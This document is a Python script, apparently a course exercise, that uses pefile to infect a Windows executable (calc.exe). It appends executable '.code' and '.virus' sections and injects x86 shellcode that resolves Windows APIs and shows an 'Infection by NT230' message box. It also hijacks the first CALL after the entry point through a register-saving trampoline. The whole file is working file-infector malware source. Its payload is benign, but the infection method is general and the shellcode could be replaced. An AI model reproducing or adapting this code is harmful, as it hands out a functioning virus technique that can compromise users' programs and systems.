import pefile
import os
import mmap

exe_path = 'calc.exe'
pe = pefile.PE(exe_path)

# Quick function to align our values
def align(val_to_align, alignment):
    return int((val_to_align + alignment - 1) / alignment) * alignment

#OPTIONAL_HEADER information
image_base = pe.OPTIONAL_HEADER.ImageBase
address_of_entry_point = pe.OPTIONAL_HEADER.AddressOfEntryPoint
file_alignment = pe.OPTIONAL_HEADER.FileAlignment
section_alignment = pe.OPTIONAL_HEADER.SectionAlignment

#SECTION information
section_text = pe.sections[0]
section_text_RVA = section_text.VirtualAddress

#FILE HEADER information
original_size = os.path.getsize(exe_path)

#Search location of call hijacking
entrypoint_offset = address_of_entry_point - section_text_RVA
find_len = section_text.Misc_VirtualSize - entrypoint_offset
call_hijacking_overwriting = b""
call_hijacking_virtual_address = 0
for i in range(find_len):
  opcode_byte = section_text.get_data()[entrypoint_offset+i]
  if hex(opcode_byte) == '0xe8':
    call_hijacking_overwriting = section_text.get_data()[entrypoint_offset+i+1:entrypoint_offset+i+5]
    call_hijacking_virtual_address = address_of_entry_point + i
    break

#create  contain save registers, call virus, jmp to overwriting funtion and restore registers
def addSection(raw_size, virtual_size, name, exe_path):
  original_size = os.path.getsize(exe_path)
  fd = open(exe_path, 'a+b')
  map = mmap.mmap(fd.fileno(), 0, access=mmap.ACCESS_WRITE)
  map.resize(original_size + raw_size + virtual_size)
  map.close()
  fd.close()
  
  last_section = pe.FILE_HEADER.NumberOfSections - 1
  raw_size = align(raw_size, pe.OPTIONAL_HEADER.FileAlignment)
  virtual_size = align(virtual_size, pe.OPTIONAL_HEADER.SectionAlignment)
  raw_offset = align((pe.sections[last_section].PointerToRawData +
                      pe.sections[last_section].SizeOfRawData),
                    pe.OPTIONAL_HEADER.FileAlignment)
  virtual_offset = align((pe.sections[last_section].VirtualAddress +
                          pe.sections[last_section].Misc_VirtualSize),
                        pe.OPTIONAL_HEADER.SectionAlignment)
  characteristics = 0xE0000020

  last_section = pe.sections[-1]
  new_section = pefile.SectionStructure(pe.__IMAGE_SECTION_HEADER_format__)
  new_section.__unpack__(bytearray(new_section.sizeof()))
  new_section.set_file_offset(last_section.get_file_offset() + last_section.sizeof())

  new_section.Name = name
  new_section.Misc = new_section.Misc_PhysicalAddress = new_section.Misc_VirtualSize = virtual_size
  new_section.VirtualAddress = virtual_offset
  new_section.SizeOfRawData = raw_size
  new_section.PointerToRawData = raw_offset
  new_section.PointerToRelocations = new_section.PointerToLinenumbers = new_section.NumberOfRelocations =new_section.NumberOfLinenumbers = 0x0
  new_section.Characteristics = characteristics

  pe.sections.append(new_section)
  pe.__structures__.append(new_section)

  pe.FILE_HEADER.NumberOfSections += 1
  pe.OPTIONAL_HEADER.SizeOfImage = virtual_size + virtual_offset

  pe.write(exe_path)

#Add 2 section, one for B code, one for virus code
code_section = b".code" + (3 * b'\x00')
virus_section = b".virus" + (2 * b'\x00')
addSection(0x200,0x40, code_section, exe_path)
addSection(0x200,0x160, virus_section, exe_path)

#Insert shellcode virus to the last section (section .virus)
shellcode_virus = bytes(b"\x31\xC9\xF7\xE1\x64\x8B\x41\x30\x8B\x40\x0C\x8B\x70\x14\xAD\x96"
                        b"\xAD\x8B\x58\x10\x8B\x53\x3C\x01\xDA\x8B\x52\x78\x01\xDA\x8B\x72"
                        b"\x20\x01\xDE\x31\xC9\x41\xAD\x01\xD8\x81\x38\x47\x65\x74\x50\x75"
                        b"\xF4\x81\x78\x04\x72\x6F\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72"
                        b"\x65\x75\xE2\x8B\x72\x24\x01\xDE\x66\x8B\x0C\x4E\x49\x8B\x72\x1C"
                        b"\x01\xDE\x8B\x14\x8E\x01\xDA\x89\xD5\x31\xC9\x51\x68\x61\x72\x79"
                        b"\x41\x68\x4C\x69\x62\x72\x68\x4C\x6F\x61\x64\x54\x53\xFF\xD2\x68"
                        b"\x6C\x6C\x61\x61\x66\x81\x6C\x24\x02\x61\x61\x68\x33\x32\x2E\x64"
                        b"\x68\x55\x73\x65\x72\x54\xFF\xD0\x68\x6F\x78\x41\x61\x66\x83\x6C"
                        b"\x24\x03\x61\x68\x61\x67\x65\x42\x68\x4D\x65\x73\x73\x54\x50\xFF"
                        b"\xD5\x83\xC4\x10\x31\xD2\x31\xC9\x52\x68\x33\x30\x20\x20\x68\x20"
                        b"\x4E\x54\x32\x68\x6E\x20\x62\x79\x68\x63\x74\x69\x6F\x68\x49\x6E"
                        b"\x66\x65\x89\xE7\x52\x68\x38\x33\x20\x20\x68\x35\x32\x30\x31\x68"
                        b"\x39\x2D\x31\x39\x68\x32\x31\x34\x33\x68\x2D\x31\x39\x35\x68\x32"
                        b"\x33\x30\x37\x68\x31\x39\x35\x32\x89\xE1\x52\x57\x51\x52\xFF\xD0"
                        b"\x83\xC4\x50\x8B\x04\x24\xC3")

raw_offset_virus = pe.sections[-1].PointerToRawData
pe.set_bytes_at_offset(raw_offset_virus, shellcode_virus)
pe.write(exe_path)

#Insert shellcode B to the B section (section .code)
shellcode_B = bytes(b"\x60\x9C\xE8")
call_virus_address = pe.sections[-1].VirtualAddress - 5 - (pe.sections[-2].VirtualAddress + 2)
shellcode_B += (call_virus_address).to_bytes(4, byteorder='little') + b"\x90\x90\x90\x9D\x61\xE9"

call_hijacking_address = int.from_bytes(call_hijacking_overwriting, byteorder='little') + 5 + \
                          call_hijacking_virtual_address

call_overwriting_function_again = 2**32 + (call_hijacking_address - 5 - (pe.sections[-2].VirtualAddress + 0xC))

shellcode_B += (call_overwriting_function_again).to_bytes(4, byteorder='little') + b"\xc3"

raw_offset_B = pe.sections[-2].PointerToRawData
pe.set_bytes_at_offset(raw_offset_B, shellcode_B)
pe.write(exe_path)

#call B in section .text
offset = call_hijacking_virtual_address - section_text.VirtualAddress
raw_overwriting_address = section_text.PointerToRawData + offset

call_B_address = pe.sections[-2].VirtualAddress - 5 - call_hijacking_virtual_address
call_B = b"\xe8" + (call_B_address).to_bytes(4, byteorder='little')

pe.set_bytes_at_offset(raw_overwriting_address, call_B)
pe.write(exe_path)